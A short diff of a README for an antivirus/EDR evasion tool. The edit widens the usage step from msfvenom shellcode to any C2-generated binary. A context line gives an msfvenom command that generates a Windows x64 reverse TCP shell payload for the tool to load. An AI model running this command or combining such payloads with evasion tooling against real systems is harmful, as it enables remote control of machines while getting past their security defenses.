@@ -16,7 +16,7 @@ It's a AV/EDR Evasion tool created to bypass security tools for learning, until 
 
 # How to use it
 
-Generate your shellcode with msfvenom tool :
+Generate your shellcode with msfvenom tool or any other C2 generated BIN file:
 
  * msfvenom -p windows/x64/custom/reverse_tcp LHOST<IP> LPORT<PORT> -f raw -o payload.bin
 
